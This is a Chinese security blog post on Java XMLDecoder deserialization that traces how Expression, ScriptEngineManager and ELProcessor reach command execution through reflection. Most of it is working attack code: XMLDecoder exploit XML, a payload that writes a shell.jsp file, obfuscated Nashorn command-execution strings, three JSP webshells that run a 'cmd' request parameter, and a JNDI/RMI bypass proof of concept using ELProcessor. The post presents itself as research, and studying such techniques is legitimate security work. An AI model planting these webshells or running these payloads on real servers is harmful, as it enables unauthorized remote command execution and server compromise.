> 原文链接: https://www.anquanke.com//post/id/248771 


# XMLDecoder反序列化漏洞底层扩展与WebShell


                                阅读量   
                                **25171**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t0184d83dd51729d59b.jpg)](https://p5.ssl.qhimg.com/t0184d83dd51729d59b.jpg)



## XMLDecoder反序列化漏洞底层

[参考](https://www.freebuf.com/articles/network/247331.html)的文章已经分析的非常详细了，这里我主要是就是一下最后的执行是怎么样的。也就是Expression类的使用

```
import java.beans.Expression;

public class test `{`
    public static void main(String[] args)throws Exception `{`
        Parameter();//有参数
        NoParameter();//无参数
    `}`
    public static void Parameter() throws Exception`{`
        Object var3 = new ProcessBuilder();
        String var4 = "command";
        String[] strings = new String[]`{`"calc"`}`;
        Object[] var2 = new Object[]`{`strings`}`;
        Expression var5 = new Expression(var3, var4, var2);
        Object value = var5.getValue();//获得参数的类

        String var1 = "start";
        Object[] var6 = new Object[]`{``}`;
        Expression expression = new Expression(value, var1, var6);//执行start方法
        expression.getValue();

//        为什么不能执行？因为class.newInstance只能调用无参构造函数而ProcessBuilder没有无参数构造函数。
//        Class&lt;?&gt; aClass = value.getClass();
//        Object o = aClass.newInstance();
//        Method start = aClass.getMethod("start");
//        start.invoke(o);
    `}`
    public static void NoParameter()`{`
        String[] strings = new String[]`{`"cmd.exe","/c","calc"`}`;
        Object var3 = new ProcessBuilder(strings);
        String var4 = "start";
        Object[] var2 = new Object[]`{``}`;
        Expression var5 = new Expression(var3, var4, var2);
        try `{`
            var5.getValue();
        `}` catch (Exception e) `{`
            e.printStackTrace();
        `}`
    `}`
`}`
```

并且通过测试可以发现Expression的使用，给出下面的例子。

```
public class cmd `{`
    public void Noparameter()`{`
        System.out.println("无参数调用....");
    `}`
    public void Parameter(Object[] obj)`{`
        System.out.println("有参数调用....");
    `}`
`}`
import java.beans.Expression;

public class test1 `{`
    public static void main(String[] args)throws Exception `{`
        Object var3 = new cmd();
        String var4 = "Parameter";//Noparameter
        Object[] var2 = new Object[]`{`"233333"`}`;
        var2 = new Object[]`{`var2`}`;
        var2 = new Object[]`{``}`;
        Expression var5 = new Expression(var3, var4, var2);
        var5.getValue();
    `}`
`}`
```

并且给出了一些exp。

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;java&gt;
    &lt;object class="java.lang.ProcessBuilder"&gt;
        &lt;array class="java.lang.String" length="3"&gt;
            &lt;void index="0"&gt;
                &lt;string&gt;cmd.exe&lt;/string&gt;
            &lt;/void&gt;
            &lt;void index="1"&gt;
                &lt;string&gt;/c&lt;/string&gt;
            &lt;/void&gt;
            &lt;void index="2"&gt;
                &lt;string&gt;calc&lt;/string&gt;
            &lt;/void&gt;
        &lt;/array&gt;
        &lt;void method="start"&gt;
        &lt;/void&gt;
    &lt;/object&gt;
&lt;/java&gt;
```

**通过实体编码绕过**

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;java&gt;
    &lt;object class="java.lang.ProcessBuilder"&gt;
        &lt;array class="java.lang.String" length="3"&gt;
            &lt;void index="0"&gt;
                &lt;string&gt;cmd.exe&lt;/string&gt;
            &lt;/void&gt;
            &lt;void index="1"&gt;
                &lt;string&gt;/c&lt;/string&gt;
            &lt;/void&gt;
            &lt;void index="2"&gt;
                &lt;string&gt;calc&lt;/string&gt;
            &lt;/void&gt;
        &lt;/array&gt;
        &lt;void method="start"/&gt;
    &lt;/object&gt;
&lt;/java&gt;
```

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;java&gt;
 &lt;object class="java.io.PrintWriter"&gt;
  &lt;string&gt;D:\shell.jsp&lt;/string&gt;
  &lt;void method="println"&gt;
  &lt;string&gt;
   webshell
 &lt;/string&gt;
  &lt;/void&gt;
  &lt;void method="close"/&gt;
 &lt;/object&gt;
&lt;/java&gt;
```

想了一下Expression类，底层是通过反射执行的，那我们能不能制作webshell？当然可以



## WebShell

### <a class="reference-link" name="Expression"></a>Expression

```
package shell.Expression;

import java.beans.Expression;

public class test `{`
    public static void main(String[] args) `{`
        String payload ="calc";
        Expression expression = new Expression(Runtime.getRuntime(),"\u0065"+"\u0078"+"\u0065"+"\u0063",new Object[]`{`payload`}`);
        try `{`
            expression.getValue();
        `}` catch (Exception e) `{`
            e.printStackTrace();
        `}`
    `}`
`}`
```

上面是java代码，执行的原理是反射在getValue方法中可以清楚的看到，要制作webshell就需要jsp代码。

```
&lt;%@ page import="java.beans.Expression"%&gt;
&lt;%@ page contentType="text/html; charset=UTF-8" language="java" %&gt;
&lt;%
    String payload =request.getParameter("cmd");
    Expression expression = new Expression(Runtime.getRuntime(),"\u0065"+"\u0078"+"\u0065"+"\u0063",new Object[]`{`payload`}`);
    expression.getValue();
%&gt;
```

介绍到这里又突然想到了其他表达式类的执行。

### <a class="reference-link" name="ScriptEngineManager"></a>ScriptEngineManager

通过ScriptEngineManager这个类可以实现Java跟JS的相互调用，虽然Java自己没有eval函数，但是ScriptEngineManager有eval函数，并且可以直接调用Java对象，也就相当于间接实现了Java的eval功能。

```
package shell.ScriptEngineManager;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;

public class test `{`
    public static void main(String[] args) throws Exception`{`
        String test = "print('hello word!!');";
        String payload1 = "java.lang.Runtime.getRuntime().exec(\"calc\")";
        String payload2 = "var a=exp();function exp()`{`var x=new java.lang.ProcessBuilder; x.command(\"calc\"); x.start();`}`;";
        String payload3 = "var a=exp();function exp()`{`java.lang./****/Runtime./***/getRuntime().exec(\"calc\")`}`;";
        String payload4 = "\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065.getRuntime().exec(\"calc\");";
        String payload5 = "var a= Java.type(\"java.lang\"+\".Runtime\"); var b =a.getRuntime();b.exec(\"calc\");";
        String payload6 = "load(\"nashorn:mozilla_compat.js\");importPackage(java.lang); var x=Runtime.getRuntime(); x.exec(\"calc\");";
        //兼容Rhino功能 https://blog.csdn.net/u013292493/article/details/51020057
        String payload7 = "var a =JavaImporter(java.lang); with(a)`{` var b=Runtime.getRuntime().exec(\"calc\");`}`";
//        String payload8 = "var scr = document.createElement(\"script\");scr.src = \"http://127.0.0.1:8082/js.js\";document.body.appendChild(scr);exec();";
        eval(payload7);
    `}`
    public static void eval(String payload)`{`
        payload=payload;
        ScriptEngineManager manager = new ScriptEngineManager(null);
        ScriptEngine engine = manager.getEngineByName("js");
        try `{`
            engine.eval(payload);
        `}` catch (Exception e) `{`
            e.printStackTrace();
        `}`
    `}`
`}`
```

然后自己突发奇想，思考能不能远程加载js代码？然后执行远程js代码里面的exp。参考**payload8**

```
function exec()`{`    
    var a=exp();function exp()`{`var x=new java.lang.ProcessBuilder; x.command("calc"); x.start();`}`;
`}`
```

[![](https://p3.ssl.qhimg.com/t0179f10a0c8e69a0e6.png)](https://p3.ssl.qhimg.com/t0179f10a0c8e69a0e6.png)

执行失败！百度了一下原因大概是因为java在执行js代码的时候没有浏览器的内置对象如：document，window等等。

[解决方法](https://blog.csdn.net/xiaozei523/article/details/58002392) 大概就是添加组件配置java解析浏览器的环境？？这样的话基本上不可能这样配置了，于是自己就没有在深入了解了。

#### <a class="reference-link" name="java%E6%89%A7%E8%A1%8Cjs%E4%BB%A3%E7%A0%81%E7%9A%84%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86"></a>java执行js代码的底层原理

这里自己调试会很多次中间的具体流程基本上就是一个解析过程，所以只看最后。

[![](https://p3.ssl.qhimg.com/t01e6956b494b8dcb24.png)](https://p3.ssl.qhimg.com/t01e6956b494b8dcb24.png)

其实本质上还是反射。最后的调用apply:393, ScriptRuntime (jdk.nashorn.internal.runtime) 的apply方式去执行。

在看一下调用栈：

```
apply:393, ScriptRuntime (jdk.nashorn.internal.runtime)
evalImpl:449, NashornScriptEngine (jdk.nashorn.api.scripting)
evalImpl:406, NashornScriptEngine (jdk.nashorn.api.scripting)
evalImpl:402, NashornScriptEngine (jdk.nashorn.api.scripting)
eval:155, NashornScriptEngine (jdk.nashorn.api.scripting)
eval:264, AbstractScriptEngine (javax.script)
eval:24, test (shell.ScriptEngineManager)
main:17, test (shell.ScriptEngineManager)
```

**调试过程大家可以自己去测试**

而上面的加载远程js的思路是来自自己调试的过程。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01d99bf455b7ffdf3f.png)

那webshell.无回显的

```
&lt;%@ page import="javax.script.ScriptEngineManager" %&gt;
&lt;%@ page import="javax.script.ScriptEngine" %&gt;
&lt;%
    ScriptEngineManager manager = new ScriptEngineManager(null);
    ScriptEngine engine = manager.getEngineByName("js");
    String payload = request.getParameter("cmd");
    engine.eval(payload);
%&gt;
```

然后不得不说java中还有一个表达式执行的,那就是EL表达式

### <a class="reference-link" name="ELProcessor"></a>ELProcessor

表达式语言（Expression Language），或称EL表达式，简称EL，是Java中的一种特殊的通用编程语言，借鉴于JavaScript和XPath。主要作用是在Java Web应用程序嵌入到网页（如JSP）中，用以访问页面的上下文以及不同作用域中的对象 ，取得对象属性的值，或执行简单的运算或判断操作。EL在得到某个数据时，会自动进行数据类型的转换。

ELProcessor也有自己的eval函数，并且可以调用Java对象执行命令。

```
package shell.EL;

import javax.el.ELProcessor;

public class test `{`
    public static void main(String[] args) throws Exception `{`
        String payload = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"var exp='calc';java.lang.Runtime.getRuntime().exec(exp);\")";

        String poc = "''.getClass().forName('javax.script.ScriptEngineManager')" +
                ".newInstance().getEngineByName('nashorn')" +
                ".eval(\"s=[3];s[0]='cmd.exe';s[1]='/c';s[2]='calc';java.lang.Runtime.getRuntime().exec(s);\")";

        ELeval(payload);
    `}`
    public static void ELeval(String payload)`{`
        payload=payload;
        ELProcessor elProcessor = new ELProcessor();
        try `{`
            elProcessor.eval(payload);
        `}` catch (Exception e) `{`
            e.printStackTrace();
        `}`
    `}`
`}`
```

我们也可以看看EL表达式的底层原理。

#### <a class="reference-link" name="EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86"></a>EL表达式的底层原理

我们使用payload进行debug调试，一直跟着流程走发现最后还是通过反射去执行。

[![](https://p4.ssl.qhimg.com/t01c1917365cf873f29.png)](https://p4.ssl.qhimg.com/t01c1917365cf873f29.png)

最后在AstValue类中执行getValue方法，从而调用payload，之后就会js代码执行的流程一样了。

调用栈：

```
getValue:159, AstValue (org.apache.el.parser)
getValue:190, ValueExpressionImpl (org.apache.el)
getValue:61, ELProcessor (javax.el)
eval:54, ELProcessor (javax.el)
ELeval:20, test (shell.EL)
main:13, test (shell.EL)
```

webshell.无回显的

```
&lt;%@ page import="javax.el.ELProcessor"%&gt;
&lt;%@ page contentType="text/html; charset=UTF-8" language="java" %&gt;
&lt;%
    String cmd =request.getParameter("cmd");
    String payload = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"var exp='"+cmd+"';java.lang.Runtime.getRuntime().exec(exp);\")";
    ELProcessor elProcessor = new ELProcessor();
    elProcessor.eval(payload);
%&gt;
```

介绍到这里，突然想到了jndi注入绕过jdk191+，其中的一种方法就是利用ELProcessor类

这里直接给出poc

```
Registry registry = LocateRegistry.createRegistry(rmi_port);
// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
// 强制将 'x' 属性的setter 从 'setX' 变为 'eval', 详细逻辑见 BeanFactory.getObjectInstance 代码
ref.add(new StringRefAddr("forceString", "KINGX=eval"));
// 利用表达式执行命令
ref.add(new StringRefAddr("KINGX", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd.exe','/c','calc']).start()\")"));
ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
registry.bind("Exploit", referenceWrapper);
```

还有一种方法是通过LDAP去绕过，自己写了一个[小工具](https://github.com/Firebasky/LdapBypassJndi)



## 总结

通过学习XMLDecoder的底层执行的流程去发现其他表达式执行，而其中的很多底层都是通过java反射技术实现的！

若文章中出现错误希望师傅们提出，感谢~

> 参考：
[https://www.freebuf.com/articles/network/247331.html](https://www.freebuf.com/articles/network/247331.html)
[https://www.anquanke.com/post/id/214435](https://www.anquanke.com/post/id/214435)
[https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html](https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html)
